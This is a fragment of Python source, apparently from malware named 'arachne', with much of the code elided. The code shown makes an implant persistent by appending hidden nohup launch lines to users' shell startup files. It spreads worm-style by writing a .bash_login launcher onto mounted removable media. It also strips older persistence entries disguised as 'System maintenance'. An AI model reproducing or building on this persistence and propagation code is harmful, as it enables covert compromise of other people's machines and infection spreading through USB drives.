            ...
            if os.path.exists(path):
                try:
                    ...
                    with open(path, 'a') as f:
                        ...
                        f.write(f"(cd {HIDDEN_DIR} && nohup python3 arachne_implant.py >/dev/null 2>&1 &)\n")
            ...
            if "/media" in mount or "/run/media" in mount:
                try:
                    ...
                    with open(os.path.join(worm_dir, ".bash_login"), "w") as f:
                        f.write(f"if [ -z \"${{ARACHNE_WORM_LAUNCHED+x}}\" ]; then export ARACHNE_WORM_LAUNCHED=1; (cd {worm_dir} && nohup python3 arachne_implant.py >/dev/null 2>&1 &); fi\n")
...
def cleanup_old_persistence():
    ...
    for rc_file in rc_files:
        ...
        if os.path.exists(rc_path):
            ...
            new_lines = [line for line in lines if 'arachne_agent.py' not in line and 'System maintenance' not in line]
